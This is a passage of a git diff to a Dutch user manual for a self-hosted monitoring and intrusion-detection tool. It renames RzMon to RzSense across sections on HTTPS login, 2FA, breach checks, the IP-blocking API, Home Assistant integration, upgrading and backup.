 #### Inloggen via http weigeren
-Via http staat op de inlogpagina een **rode balk**: *Deze verbinding is niet beveiligd*, met de link naar het beheeradres. Met **Inloggen via http weigeren** weigert RzMon daar ook het wachtwoord, de 2FA-code en een nieuw wachtwoord (*wachtwoord vergeten*). Aanzetten kan alleen als je zelf via https binnen bent.
+Via http staat op de inlogpagina een **rode balk**: *Deze verbinding is niet beveiligd*, met de link naar het beheeradres. Met **Inloggen via http weigeren** weigert RzSense daar ook het wachtwoord, de 2FA-code en een nieuw wachtwoord (*wachtwoord vergeten*). Aanzetten kan alleen als je zelf via https binnen bent.
 
 #### 2FA verplicht van buiten
 Met **2FA verplicht van buiten je interne netwerken** (je interne netwerken = *Toegang → Lokale netwerken*):
@@ -3700,14 +3702,14 @@ Met **2FA verplicht van buiten je interne netwerken** (je interne netwerken = *T
 
 Op de kaart staat welke gebruikers nog geen 2FA hebben.
 
-#### Een proxy die RzMon niet kent
-Komen er verzoeken met proxy-kopteksten (`X-Forwarded-For` e.d.) van een adres dat **niet** bij *Reverse proxy IP's* staat, dan weet RzMon niet wie de bezoeker is. Die bezoekers gelden daarom als **extern**: 2FA verplicht, nooit inloggen zonder wachtwoord, en het adres van de proxy wordt niet automatisch geblokkeerd. Je krijgt eenmaal per dag een ⚠️-melding, en *Hoe staat het ervoor?* toont het tot je het adres toevoegt.
+#### Een proxy die RzSense niet kent
+Komen er verzoeken met proxy-kopteksten (`X-Forwarded-For` e.d.) van een adres dat **niet** bij *Reverse proxy IP's* staat, dan weet RzSense niet wie de bezoeker is. Die bezoekers gelden daarom als **extern**: 2FA verplicht, nooit inloggen zonder wachtwoord, en het adres van de proxy wordt niet automatisch geblokkeerd. Je krijgt eenmaal per dag een ⚠️-melding, en *Hoe staat het ervoor?* toont het tot je het adres toevoegt.
 
 #### Hoe staat het ervoor?
 Nieuwe punten: *Beheer via https*, *Certificaat* (verloopt over X dagen, of het probleem), *Lokale DNS-rewrite*, *Reverse proxy* (onbekende proxy, of een proxy die geen https meldt) en *2FA van buiten*.
 
 Vanaf 1.78.0 ook (sommige met een knop om het meteen te regelen):
-- **Proxy → RzMon via http**: je proxy draait op een andere machine en stuurt het verkeer via http door naar RzMon. Dan gaan wachtwoorden en sessies het laatste stuk onversleuteld over je netwerk. RzMon toont de regels voor SWAG (`rzmon.subdomain.conf`) om te kopiëren, met het IP-adres van RzMon al ingevuld:
+- **Proxy → RzSense via http**: je proxy draait op een andere machine en stuurt het verkeer via http door naar RzSense. Dan gaan wachtwoorden en sessies het laatste stuk onversleuteld over je netwerk. RzSense toont de regels voor SWAG (`rzmon.subdomain.conf`) om te kopiëren, met het IP-adres van RzSense al ingevuld:
   ```nginx
   set $upstream_app 192.168.1.10;
   set $upstream_port 443;
@@ -3715,26 +3717,26 @@ Vanaf 1.78.0 ook (sommige met een knop om het meteen te regelen):
   proxy_pass $upstream_proto://$upstream_app:$upstream_port;
   ```
   Draait de proxy op dezelfde machine, dan is er niets aan de hand en zie je dit punt niet.
-- **Inloggen via http**: staat *Inloggen via http weigeren* uit, dan kan een wachtwoord leesbaar over je (wifi-)netwerk gaan. Knop **Weigeren** (alleen als je RzMon nu via https open hebt, anders sluit je jezelf buiten).
-- **Tip: overal hetzelfde adres** (grijs, telt niet mee): je opent RzMon via een IP-adres terwijl er een beheeradres is. Laat je DNS (AdGuard: *Filters → DNS-herschrijvingen*) dat adres naar het LAN-IP van je proxy wijzen; dan gebruik je thuis en onderweg hetzelfde adres met een geldig certificaat, zonder iets op je telefoon te installeren.
+- **Inloggen via http**: staat *Inloggen via http weigeren* uit, dan kan een wachtwoord leesbaar over je (wifi-)netwerk gaan. Knop **Weigeren** (alleen als je RzSense nu via https open hebt, anders sluit je jezelf buiten).
+- **Tip: overal hetzelfde adres** (grijs, telt niet mee): je opent RzSense via een IP-adres terwijl er een beheeradres is. Laat je DNS (AdGuard: *Filters → DNS-herschrijvingen*) dat adres naar het LAN-IP van je proxy wijzen; dan gebruik je thuis en onderweg hetzelfde adres met een geldig certificaat, zonder iets op je telefoon te installeren.
 - **Agents alleen via https**: alle agents komen al via https binnen; knop **Aanzetten**.
 
 ### 10.3 Datalekken (Have I Been Pwned, vanaf 1.69.0)
 
 **Instellingen → Beveiliging → Datalekken**
 
-RzMon controleert of **wachtwoorden** van RzMon-accounts en **e-mailadressen** in bekende datalekken staan, via [Have I Been Pwned](https://haveibeenpwned.com) (HIBP). Met de hoofdschakelaar **Controle op datalekken** zet je alles aan of uit. Na de update staat hij **uit**; dan gaat er niets naar HIBP.
+RzSense controleert of **wachtwoorden** van RzSense-accounts en **e-mailadressen** in bekende datalekken staan, via [Have I Been Pwned](https://haveibeenpwned.com) (HIBP). Met de hoofdschakelaar **Controle op datalekken** zet je alles aan of uit. Na de update staat hij **uit**; dan gaat er niets naar HIBP.
 
 #### Wachtwoorden (gratis)
-- Het wachtwoord gaat **nooit** de deur uit: RzMon stuurt alleen de eerste 5 tekens van de SHA-1-hash en vergelijkt de rest zelf (*k-anonimiteit*, met opvulling).
+- Het wachtwoord gaat **nooit** de deur uit: RzSense stuurt alleen de eerste 5 tekens van de SHA-1-hash en vergelijkt de rest zelf (*k-anonimiteit*, met opvulling).
 - **Gelekt vanaf X keer**: standaard 1 (elke treffer).
 - **Bij het instellen** van een gelekt wachtwoord (nieuwe gebruiker, 🔑, *Mijn account*, *wachtwoord vergeten*) krijg je een waarschuwing; opslaan mag wel.
 - **Bij het inloggen** met een gelekt wachtwoord kom je eerst op het scherm **"Je wachtwoord staat in een datalek"**: kies een nieuw wachtwoord, daarna kun je verder. Daar wordt een gelekt wachtwoord geweigerd. Dit geldt voor iedereen, ook beheerders. Is HIBP niet bereikbaar, dan gaat alles gewoon door.
-- Een wachtwoord wordt hooguit één keer per dag opnieuw gecontroleerd (bij het inloggen; alleen dan kent RzMon het).
+- Een wachtwoord wordt hooguit één keer per dag opnieuw gecontroleerd (bij het inloggen; alleen dan kent RzSense het).
 
 #### E-mailadressen (API-sleutel)
 - Vul je **API-sleutel** in (te koop op [haveibeenpwned.com/API/Key](https://haveibeenpwned.com/API/Key)) en klik op **🧪 Testen**: je ziet je abonnement en hoeveel verzoeken per minuut het toestaat.
-- RzMon controleert **dagelijks** de e-mailadressen van gebruikers met de controle aan, de **extra e-mailadressen** (één per regel) en, als je dat invult, je **domein**. Een domein moet je eerst op de site van HIBP verifiëren (*Domain search*); voor grotere domeinen is een groter abonnement nodig.
+- RzSense controleert **dagelijks** de e-mailadressen van gebruikers met de controle aan, de **extra e-mailadressen** (één per regel) en, als je dat invult, je **domein**. Een domein moet je eerst op de site van HIBP verifiëren (*Domain search*); voor grotere domeinen is een groter abonnement nodig.
 - De verzoeken worden gespreid binnen de limiet van je abonnement (via cron, elke minuut een paar adressen).
 - **Meldingen:**
   - ⚠️ **warning** (Pushover) bij een **nieuw lek met wachtwoorden**;
@@ -3821,10 +3823,10 @@ curl -H "Authorization: Bearer rzm_xxx" -d '{"host":"web01","ip":"203.0.113.7"}'
 - De server geef je met `host` (naam, hoofdletters maken niet uit) of `host_id`.
 - Het antwoord bevat `id`, `active` en `until`. Staat het IDS op **leren** (of uit), dan wordt de blokkade wel vastgelegd, maar is `active` `false` en staat er een `note` bij; hij wordt actief zodra je het IDS op *blokkeren* zet.
 - Is het IP op die server al geblokkeerd, dan krijg je `"already": true` met de bestaande blokkade (er komt geen tweede).
-- **Nooit via de API:** je LAN (*Lokale netwerken*), het adres van RzMon zelf en de ✅ *whitelist* weigert de API altijd (HTTP 422).
+- **Nooit via de API:** je LAN (*Lokale netwerken*), het adres van RzSense zelf en de ✅ *whitelist* weigert de API altijd (HTTP 422).
 - Een opgeheven blokkade wist ook de mislukte pogingen van dat IP, net als ⛔ op de IDS-pagina.
 
-**Voorbeeld: fail2ban meldt zijn bans aan RzMon.** Maak `/etc/fail2ban/action.d/rzmon.conf`:
+**Voorbeeld: fail2ban meldt zijn bans aan RzSense.** Maak `/etc/fail2ban/action.d/rzmon.conf`:
 ```ini
 [Definition]
 actionban   = curl -fsS -m 10 -H "Authorization: Bearer <rzmon_key>" -d '{"host":"<rzmon_host>","ip":"<ip>","hours":24,"reason":"fail2ban <name>"}' <rzmon_url>/v1.php/ids/block
@@ -3871,15 +3873,15 @@ rest:
       Authorization: !secret rzmon_auth
     scan_interval: 60
     sensor:
-      - name: "RzMon status"
+      - name: "RzSense status"
         value_template: "{{ value_json.status_text }}"
         json_attributes: [counts, problems]
-      - name: "RzMon problemen"
+      - name: "RzSense problemen"
         value_template: "{{ value_json.counts.warning + value_json.counts.critical }}"
-      - name: "RzMon in onderhoud"
+      - name: "RzSense in onderhoud"
         value_template: "{{ value_json.counts.maintenance }}"
     binary_sensor:
-      - name: "RzMon alles OK"
+      - name: "RzSense alles OK"
         value_template: "{{ value_json.status == 0 }}"
 
   - resource: http://192.168.1.10/v1.php/checks/3      # bv. CPU van je webserver
@@ -3909,12 +3911,12 @@ Een eigen kaart voor je HA-dashboard met **het netwerk in het kort**, in dezelfd
 - **Top verkeer vandaag**: de drie apparaten met het meeste verkeer;
 - **Servers** (vanaf 1.198.0, schakelaar *Servers*): elke server met een bolletje, CPU, RAM en disk als balkje (oranje vanaf 75%, rood vanaf 90%) en wat er speelt: *2 problemen*, *agent stil 12 min* of *onderhoud*. De ergste bovenaan; met *Max. servers* (standaard 8) kies je hoeveel er staan. De servers tellen dan ook mee in het oordeel bovenaan.
 
-Tik op een tegel of regel en RzMon opent op die plek (Netwerkpaden, Netwerk → Ontdekken, IDS …). De kaart volgt het thema (licht/donker) en de taal van Home Assistant, en ververst elke minuut (en meteen als je het dashboard weer opent).
+Tik op een tegel of regel en RzSense opent op die plek (Netwerkpaden, Netwerk → Ontdekken, IDS …). De kaart volgt het thema (licht/donker) en de taal van Home Assistant, en ververst elke minuut (en meteen als je het dashboard weer opent).
 
 **Zo zet je hem erin:**
-1. Maak in RzMon bij **Instellingen → Koppelingen → API-sleutels** een sleutel met alleen **Status lezen** (en **IDS lezen** voor de IDS-tegel). Het venster met de nieuwe sleutel toont meteen de YAML voor de kaart.
-2. In Home Assistant: **Instellingen → Dashboards → ⋮ → Bronnen → Bron toevoegen**. URL: `https://<rzmon>/ha-card.php`, soort **JavaScript-module**. (De juiste URL staat in RzMon onder de API-sleutels.)
-3. Ververs de pagina, bewerk een dashboard en voeg de kaart **RzMon netwerk** toe. Vul de URL van RzMon en de sleutel in; de rest kies je met schakelaars. Of in YAML:
+1. Maak in RzSense bij **Instellingen → Koppelingen → API-sleutels** een sleutel met alleen **Status lezen** (en **IDS lezen** voor de IDS-tegel). Het venster met de nieuwe sleutel toont meteen de YAML voor de kaart.
+2. In Home Assistant: **Instellingen → Dashboards → ⋮ → Bronnen → Bron toevoegen**. URL: `https://<rzmon>/ha-card.php`, soort **JavaScript-module**. (De juiste URL staat in RzSense onder de API-sleutels.)
+3. Ververs de pagina, bewerk een dashboard en voeg de kaart **RzSense netwerk** toe. Vul de URL van RzSense en de sleutel in; de rest kies je met schakelaars. Of in YAML:
 ```yaml
 type: custom:rzmon-network-card
 url: https://rzmon.thuis.lan
@@ -3925,7 +3927,7 @@ show_ids: true         # en show_internet, show_month, show_devices, show_paths,
 max_servers: 8         # hoeveel servers (de rest als "+3 meer")
 ```
 **Goed om te weten:**
-- De gegevens worden door de **browser of de HA-app zelf** bij RzMon opgehaald, niet door de HA-server. RzMon moet dus bereikbaar zijn vanaf je telefoon en computer, en gebruikt Home Assistant **https**, dan moet RzMon ook via https bereikbaar zijn (anders blokkeert de browser het als *mixed content*).
+- De gegevens worden door de **browser of de HA-app zelf** bij RzSense opgehaald, niet door de HA-server. RzSense moet dus bereikbaar zijn vanaf je telefoon en computer, en gebruikt Home Assistant **https**, dan moet RzSense ook via https bereikbaar zijn (anders blokkeert de browser het als *mixed content*).
 - Zet je **Alleen vanaf** bij de sleutel, neem dan de adressen (of het netwerk) van je telefoon en computer op.
 - Iedereen die het dashboard mag bewerken kan de sleutel zien. Geef de sleutel daarom **alleen leesrechten**.
 - Het endpoint erachter is `GET /v1.php/network` (met `?servers=1` ook de servers); je kunt het ook zelf gebruiken (bijvoorbeeld in een `rest`-sensor).
@@ -3935,13 +3937,13 @@ Een eenvoudige pagina voor huisgenoten of klanten: *Instellingen → Koppelingen
 - Kies **onderdelen** ("Internet", "NAS", "Plex"…), elk met de checks die erbij horen. Het ergste van die checks telt; checks in onderhoud tonen *Onderhoud*.
 - Per onderdeel een **balk per dag over de laatste 90 dagen** (uit de dagtotalen van Analyse), een eigen **titel** en een **mededeling** ("Zaterdag onderhoud aan de NAS"). De pagina ververst elke minuut, in licht en donker, ook op de telefoon.
 - Er staan **geen IP-adressen, servernamen of foutteksten** op.
-- Te openen via een **geheime link** (`/status.php?k=…`), ook van buiten. Een verkeerde link geeft een gewone 404 (niet herkenbaar als RzMon). Met **↻ Nieuwe link** werkt de oude meteen niet meer. Zet `/status.php` door in je reverse proxy als je hem van buiten wilt openen.
-- **Lokaal of extern** (vanaf 1.128.0): naast *Geheime link* staat een schakelaar **🏠 Lokaal | 🌐 Extern**. *Lokaal* maakt de link met de *Basis-URL* (bijv. `http://192.168.2.207`), *Extern* met de **Externe URL** die je invult bij *Instellingen → Database en server → Server en PHP* (bijv. `https://status.voorbeeld.nl`). De sleutel is in beide gevallen dezelfde; alleen het adres ervoor verandert, en RzMon onthoudt je keuze. Zonder externe URL staat *Extern* grijs, met een link naar Server en PHP. Staat *Alleen https* aan, dan stuurt RzMon de statuspagina op het externe adres niet door naar het beheeradres; de rest van RzMon blijft alleen via het beheeradres te openen.
+- Te openen via een **geheime link** (`/status.php?k=…`), ook van buiten. Een verkeerde link geeft een gewone 404 (niet herkenbaar als RzSense). Met **↻ Nieuwe link** werkt de oude meteen niet meer. Zet `/status.php` door in je reverse proxy als je hem van buiten wilt openen.
+- **Lokaal of extern** (vanaf 1.128.0): naast *Geheime link* staat een schakelaar **🏠 Lokaal | 🌐 Extern**. *Lokaal* maakt de link met de *Basis-URL* (bijv. `http://192.168.2.207`), *Extern* met de **Externe URL** die je invult bij *Instellingen → Database en server → Server en PHP* (bijv. `https://status.voorbeeld.nl`). De sleutel is in beide gevallen dezelfde; alleen het adres ervoor verandert, en RzSense onthoudt je keuze. Zonder externe URL staat *Extern* grijs, met een link naar Server en PHP. Staat *Alleen https* aan, dan stuurt RzSense de statuspagina op het externe adres niet door naar het beheeradres; de rest van RzSense blijft alleen via het beheeradres te openen.
 
 ## 12. Upgraden
 
 ### Versienummer
-RzMon heeft een versienummer (bijvoorbeeld **v1.6.0**). Je ziet het:
+RzSense heeft een versienummer (bijvoorbeeld **v1.6.0**). Je ziet het:
 - naast het logo in de topbalk; klik erop voor de lijst met wijzigingen in [`CHANGELOG.md`](CHANGELOG.md);
 - op de login- en setup-pagina;
 - in de API (`GET /api/v1/status` → `version`, en `api.php?action=ping`).
@@ -3951,19 +3953,19 @@ De nummering is *major.minor.patch*:
 - **minor** (1.6 → 1.7): nieuwe functies, volledig compatibel;
 - **major** (1 → 2): er verandert iets waar je zelf iets voor moet doen. Dat staat dan in de changelog.
 
-**De agent heeft een eigen versienummer** (sinds RzMon 1.46.0 en agent 1.45.1), los van RzMon. Verandert er alleen iets in RzMon, dan blijft de agent op zijn versie en hoef je niets bij te werken. Wat er in de agent verandert, staat in [`agent/CHANGELOG.md`](agent/CHANGELOG.md). De Home Assistant-add-on heeft hetzelfde nummer als de agent.
+**De agent heeft een eigen versienummer** (sinds RzSense 1.46.0 en agent 1.45.1), los van RzSense. Verandert er alleen iets in RzSense, dan blijft de agent op zijn versie en hoef je niets bij te werken. Wat er in de agent verandert, staat in [`agent/CHANGELOG.md`](agent/CHANGELOG.md). De Home Assistant-add-on heeft hetzelfde nummer als de agent.
 
 Elke agent geeft zijn versie door, en je ziet die op de servertegel (bijvoorbeeld `agent 1 min geleden · v1.45.1`). Is er een nieuwere agent, dan staat er **⬆** achter. In het venster *Agent Manager* zie je de versie van de agent en de nieuwste, met de knop om bij te werken. Met `rzmon-agent.sh --version` zie je de versie op de server zelf.
 
 **Bij een update blijven je instellingen staan:**
-- RzMon: `config.php` en alle instellingen in de database (bijvoorbeeld IDS aan en de modus, meldingen, back-up) blijven precies zoals ze waren. Het bijwerken van de database voegt alleen nieuwe instellingen toe; een bestaande instelling wordt nooit veranderd.
+- RzSense: `config.php` en alle instellingen in de database (bijvoorbeeld IDS aan en de modus, meldingen, back-up) blijven precies zoals ze waren. Het bijwerken van de database voegt alleen nieuwe instellingen toe; een bestaande instelling wordt nooit veranderd.
 - Agent: `/etc/default/rzmon-agent` blijft byte voor byte gelijk (zie 8.2).
 
-### Bijwerken vanuit RzMon ⬆ (Rocky Linux, vanaf 1.29.0)
-Onder **Instellingen → ⬆ RzMon bijwerken** werk je RzMon bij zonder terminal.
-- **Is er een update?** RzMon kijkt één keer per dag op GitHub, of direct met **🔍 Nu controleren**. Is er een nieuwe versie, dan zie je bovenin naast het versienummer een groen label **⬆ 1.x.y**, en op de kaart **wat er nieuw is** (de changelog van alle versies sinds de jouwe).
-- **⬆ Nu bijwerken naar 1.x.y** (of klik op het groene label **⬆ 1.x.y** bovenin): een venster vraagt of je wilt bijwerken. Bovenaan staan je versie en de nieuwe als chips (*1.203.0 → 1.204.0*), daaronder *Wat is er nieuw* als korte kaartjes (met **Alles lezen** voor de hele lijst), de schakelaar **Eerst een back-up maken** en de versiekeuze. Na **⬆ Bijwerken** zie je in hetzelfde venster een **voortgangsring** met percentage en verstreken tijd, en ernaast een **tijdlijn van de stappen** met de duur per stap en **waar de installatie nu mee bezig is** (bij *Installeren* het onderdeel, bv. *Onderdeel 4 van 9: Database*). Het **logboek** staat eronder als terminal (dicht; bij een fout open). Tijdens het herstarten is RzMon even niet bereikbaar; een oranje regel zegt dan *RzMon wordt herstart* en het venster wacht. **Klaar**: een vinkje, hoe lang het duurde, of er een back-up is gemaakt en hoe lang RzMon niet bereikbaar was; de pagina herlaadt na 3 seconden (of meteen met **Nu herladen**). **Mislukt**: je ziet welke stap misging, of er iets veranderd is, en **↻ Opnieuw proberen** (vanaf 1.204.0). Met **Op de achtergrond** sluit je het venster; het label bovenin toont dan *⏳ Bijwerken…*, en na herladen of in een ander tabblad gaat het venster vanzelf weer open. De hulpdienst op de server voert vaste stappen uit:
-  1. *Controleren:* de RzMon-map moet vergrendeld zijn en alle bestanden van root;
+### Bijwerken vanuit RzSense ⬆ (Rocky Linux, vanaf 1.29.0)
+Onder **Instellingen → ⬆ RzSense bijwerken** werk je RzSense bij zonder terminal.
+- **Is er een update?** RzSense kijkt één keer per dag op GitHub, of direct met **🔍 Nu controleren**. Is er een nieuwe versie, dan zie je bovenin naast het versienummer een groen label **⬆ 1.x.y**, en op de kaart **wat er nieuw is** (de changelog van alle versies sinds de jouwe).
+- **⬆ Nu bijwerken naar 1.x.y** (of klik op het groene label **⬆ 1.x.y** bovenin): een venster vraagt of je wilt bijwerken. Bovenaan staan je versie en de nieuwe als chips (*1.203.0 → 1.204.0*), daaronder *Wat is er nieuw* als korte kaartjes (met **Alles lezen** voor de hele lijst), de schakelaar **Eerst een back-up maken** en de versiekeuze. Na **⬆ Bijwerken** zie je in hetzelfde venster een **voortgangsring** met percentage en verstreken tijd, en ernaast een **tijdlijn van de stappen** met de duur per stap en **waar de installatie nu mee bezig is** (bij *Installeren* het onderdeel, bv. *Onderdeel 4 van 9: Database*). Het **logboek** staat eronder als terminal (dicht; bij een fout open). Tijdens het herstarten is RzSense even niet bereikbaar; een oranje regel zegt dan *RzSense wordt herstart* en het venster wacht. **Klaar**: een vinkje, hoe lang het duurde, of er een back-up is gemaakt en hoe lang RzSense niet bereikbaar was; de pagina herlaadt na 3 seconden (of meteen met **Nu herladen**). **Mislukt**: je ziet welke stap misging, of er iets veranderd is, en **↻ Opnieuw proberen** (vanaf 1.204.0). Met **Op de achtergrond** sluit je het venster; het label bovenin toont dan *⏳ Bijwerken…*, en na herladen of in een ander tabblad gaat het venster vanzelf weer open. De hulpdienst op de server voert vaste stappen uit:
+  1. *Controleren:* de RzSense-map moet vergrendeld zijn en alle bestanden van root;
   2. *Back-up maken:* als de schakelaar **Eerst een back-up maken** aan staat (standaard). De back-up staat daarna in de lijst onder *Back-up*;
   3. *Nieuwste versie ophalen* (`git pull`);
   4. *Installeren:* het installatiescript (`install-rocky.sh --yes`), net als wanneer je het commando zelf uitvoert: rechten, SELinux, hulpdienst en tabellen.
@@ -3972,10 +3974,10 @@ Onder **Instellingen → ⬆ RzMon bijwerken** werk je RzMon bij zonder terminal
 - **🔁 Andere versie…** (vanaf 1.90.0): in het venster kies je een **versie** uit de lijst (alle versies uit de changelog op GitHub, met datum).
   - **Niets kiezen** is gewoon de nieuwste.
   - Een **oudere** versie (*ouder: terugzetten*) bevestig je met je wachtwoord (op het LAN typ je `TERUGZETTEN`). Je instellingen en gegevens blijven staan. De database blijft zoals hij is; nieuwere kolommen gebruikt de oudere versie gewoon niet. Wat er sindsdien bij kwam, werkt dan niet meer.
-  - De hulpdienst zoekt de commit waarin `VERSION` dat nummer kreeg en zet RzMon daarop (`git reset --hard`), daarna draait het installatiescript zoals altijd. Later weer naar de nieuwste gaat gewoon met *Nu bijwerken*.
+  - De hulpdienst zoekt de commit waarin `VERSION` dat nummer kreeg en zet RzSense daarop (`git reset --hard`), daarna draait het installatiescript zoals altijd. Later weer naar de nieuwste gaat gewoon met *Nu bijwerken*.
   - Zolang je bewust een andere versie dan de nieuwste gebruikt, **pauzeert automatisch bijwerken** (📌 op de kaart). Anders zou de nacht erna alles terugdraaien.
   - Kies je een versie van vóór 1.90.0, dan kent de hulpdienst daar nog geen versiekeuze. Ga eerst weer naar de nieuwste om opnieuw te kunnen kiezen.
-- **Automatisch bijwerken:** zet de schakelaar aan en kies een tijdstip (standaard 04:00). Is er een nieuwe versie, dan werkt RzMon zichzelf die dag in het uur na dat tijdstip bij, met een back-up vooraf als die schakelaar aan staat. De agents werk je apart bij (*⬆ Agents bijwerken*).
+- **Automatisch bijwerken:** zet de schakelaar aan en kies een tijdstip (standaard 04:00). Is er een nieuwe versie, dan werkt RzSense zichzelf die dag in het uur na dat tijdstip bij, met een back-up vooraf als die schakelaar aan staat. De agents werk je apart bij (*⬆ Agents bijwerken*).
 - **Eenmalig nodig:** de hulpdienst voor bijwerken. Die zet `install-rocky.sh` klaar; voer na de update naar 1.29.0 het installatiecommando dus nog één keer uit. Controleren: `systemctl status rzmon-update.path`.
 - **Veiligheid:** de webpagina zet alleen een verzoek neer (`/var/lib/rzmon/update.request`). De hulpdienst (`/usr/local/sbin/rzmon-update`, als root) voert altijd dezelfde stappen uit, en weigert als de map ontgrendeld is (`--unlock`) of als een bestand niet van root is. Het logboek staat in `/var/lib/rzmon/update.log`.
 - Werkt alleen bij een installatie met `install-rocky.sh` (git). Bij een andere installatie zegt de kaart dat, en werk je handmatig bij zoals hieronder.
@@ -3985,11 +3987,11 @@ Onder **Instellingen → ⬆ RzMon bijwerken** werk je RzMon bij zonder terminal
 git -C ~/rzmon pull && sudo bash ~/rzmon/install/install-rocky.sh --repo ~/rzmon
 ```
 Gebruik je de curl-methode (openbare repository), voer dan hetzelfde curl-commando uit als bij de installatie. Zie ook [INSTALL-ROCKY-LINUX-10.md](INSTALL-ROCKY-LINUX-10.md).
-Het script haalt de nieuwste versie op en meldt bijvoorbeeld `RzMon bijgewerkt van 1.5.0 naar 1.6.0`.
+Het script haalt de nieuwste versie op en meldt bijvoorbeeld `RzSense bijgewerkt van 1.5.0 naar 1.6.0`.
 
 ### Handmatig bijwerken
 1. **Maak eerst een back-up** (hoofdstuk 13).
-2. **Zet de nieuwe bestanden eroverheen** (`git pull` in de RzMon-map, of uitpakken). Laat `config.php` staan:
+2. **Zet de nieuwe bestanden eroverheen** (`git pull` in de RzSense-map, of uitpakken). Laat `config.php` staan:
    ```bash
    cd /tmp && unzip -o rzmon.zip
    sudo rsync -a --exclude config.php /tmp/rzmon/ /var/www/rzmon/
@@ -4008,15 +4010,15 @@ Het script haalt de nieuwste versie op en meldt bijvoorbeeld `RzMon bijgewerkt v
 5. **Ververs de browser** met Ctrl+F5.
 
 ### Voor ontwikkelaars: versie verhogen
-RzMon en de agent hebben elk een eigen nummer. Verhoog alleen wat je veranderd hebt:
+RzSense en de agent hebben elk een eigen nummer. Verhoog alleen wat je veranderd hebt:
 ```bash
-tools/bump-version.sh rzmon minor   # RzMon: VERSION + lege sectie in CHANGELOG.md
+tools/bump-version.sh rzmon minor   # RzSense: VERSION + lege sectie in CHANGELOG.md
 tools/bump-version.sh agent patch   # agent: agent/VERSION, AGENT_VERSION, add-on-versie + lege sectie in agent/CHANGELOG.md
 # vul de changelog(s) in, daarna:
 tools/bump-version.sh sync          # agent en agent/CHANGELOG.md naar de add-on kopiëren
 tools/check-version.sh              # controleert beide nummers en de changelogs
 ```
-Patch is voor reparaties, minor voor nieuwe functies, major als de gebruiker zelf iets moet aanpassen. Heeft een nieuwe functie in RzMon ook een nieuwere agent nodig, zet dat dan in de changelog van RzMon ("agent 1.x.y nodig"). Een nieuwe agent krijgt altijd ook een patch-versie van RzMon: RzMon levert de agent aan je servers, en ⬆ *RzMon bijwerken* kijkt alleen naar het nummer van RzMon.
+Patch is voor reparaties, minor voor nieuwe functies, major als de gebruiker zelf iets moet aanpassen. Heeft een nieuwe functie in RzSense ook een nieuwere agent nodig, zet dat dan in de changelog van RzSense ("agent 1.x.y nodig"). Een nieuwe agent krijgt altijd ook een patch-versie van RzSense: RzSense levert de agent aan je servers, en ⬆ *RzSense bijwerken* kijkt alleen naar het nummer van RzSense.
 
 Op GitHub controleert een Action (`Versiecontrole`) bij elke push of de nummers kloppen, de kopieën in de add-on gelijk zijn en de changelogs ingevuld zijn.
 
@@ -4026,7 +4028,7 @@ Op GitHub controleert een Action (`Versiecontrole`) bij elke push of de nummers 
 
 ## 13. Back-up en herstel
 
-Belangrijk zijn alleen de **database** en **`config.php`**. RzMon maakt daar zelf back-ups van: onder **Instellingen → 💾 Back-up** (alleen beheerders).
+Belangrijk zijn alleen de **database** en **`config.php`**. RzSense maakt daar zelf back-ups van: onder **Instellingen → 💾 Back-up** (alleen beheerders).
 
 ### Instellen
 
@@ -4041,7 +4043,7 @@ Belangrijk zijn alleen de **database** en **`config.php`**. RzMon maakt daar zel
 
 > **Bewaar het zip-wachtwoord goed**, bijvoorbeeld in je wachtwoordmanager. Zonder dat wachtwoord is een back-up onbruikbaar. Een versleutelde zip open je met **7-Zip** of een vergelijkbaar programma; de ingebouwde zip van Windows en macOS kan geen AES.
 
-Mislukt een automatische back-up (disk vol, map niet schrijfbaar…), dan krijg je **één melding** via je meldkanalen (Pushover, e-mail, Home Assistant). RzMon probeert het daarna elk uur opnieuw en meldt het als het weer lukt.
+Mislukt een automatische back-up (disk vol, map niet schrijfbaar…), dan krijg je **één melding** via je meldkanalen (Pushover, e-mail, Home Assistant). RzSense probeert het daarna elk uur opnieuw en meldt het als het weer lukt.
 
 ### Wat zit er in de zip?
 
@@ -4049,7 +4051,7 @@ Mislukt een automatische back-up (disk vol, map niet schrijfbaar…), dan krijg 
 - `config.php`: met het databasewachtwoord;
 - `info.txt`: versie, datum, server en het aantal rijen per tabel (niet versleuteld, bevat geen geheimen).
 
-De back-ups staan in `/var/lib/rzmon/backups`, buiten de webmap, alleen leesbaar voor root en de webserver. Een andere map kan met `'backup_dir' => '/pad'` in `config.php`. RzMon maakt de back-ups in PHP zelf: `mysqldump` is niet nodig, alleen de PHP-extensie **zip** (`php-zip`).
+De back-ups staan in `/var/lib/rzmon/backups`, buiten de webmap, alleen leesbaar voor root en de webserver. Een andere map kan met `'backup_dir' => '/pad'` in `config.php`. RzSense maakt de back-ups in PHP zelf: `mysqldump` is niet nodig, alleen de PHP-extensie **zip** (`php-zip`).
 
 > Bewaar af en toe een kopie **buiten de server**: download een zip (⬇) en zet hem op je NAS of in de cloud. Een back-up op dezelfde disk helpt niet als die disk stukgaat.
 
@@ -4063,14 +4065,14 @@ De back-ups staan in `/var/lib/rzmon/backups`, buiten de webmap, alleen leesbaar
 ### Terugzetten
 
 1. Klik op **↺** bij de back-up en bevestig met je wachtwoord (op het LAN zonder inloggen: `HERSTELLEN`). Heeft de zip een ander wachtwoord dan het ingestelde, vul dat dan in.
-2. RzMon maakt eerst een **veiligheidsback-up** van de huidige toestand (*voor herstel* in de lijst).
-3. Daarna wordt de database teruggezet. Mislukt dat halverwege, dan zet RzMon automatisch de veiligheidsback-up terug: het is alles of niets.
+2. RzSense maakt eerst een **veiligheidsback-up** van de huidige toestand (*voor herstel* in de lijst).
+3. Daarna wordt de database teruggezet. Mislukt dat halverwege, dan zet RzSense automatisch de veiligheidsback-up terug: het is alles of niets.
 
 Goed om te weten:
 - Het back-upschema en het zip-wachtwoord blijven zoals ze nu zijn.
 - Gebruikers en wachtwoorden worden die uit de back-up; misschien moet je opnieuw inloggen.
-- Een back-up van een oudere RzMon-versie kan gewoon; de tabellen worden daarna bijgewerkt.
-- RzMon zet alleen terug wat hij zelf heeft geschreven (tabellen en rijen). Een gewijzigde of afgebroken `database.sql` wordt geweigerd.
+- Een back-up van een oudere RzSense-versie kan gewoon; de tabellen worden daarna bijgewerkt.
+- RzSense zet alleen terug wat hij zelf heeft geschreven (tabellen en rijen). Een gewijzigde of afgebroken `database.sql` wordt geweigerd.
 - `config.php` wordt via de webpagina niet teruggezet; op dezelfde server is dat ook niet nodig.
 
 ### In de terminal en op een nieuwe server
@@ -4083,13 +4085,13 @@ sudo php /var/www/rzmon/install/install.php --restore /pad/naar/rzmon-backup-…
 
 **Naar een nieuwe server** (bijvoorbeeld na een crash):
 
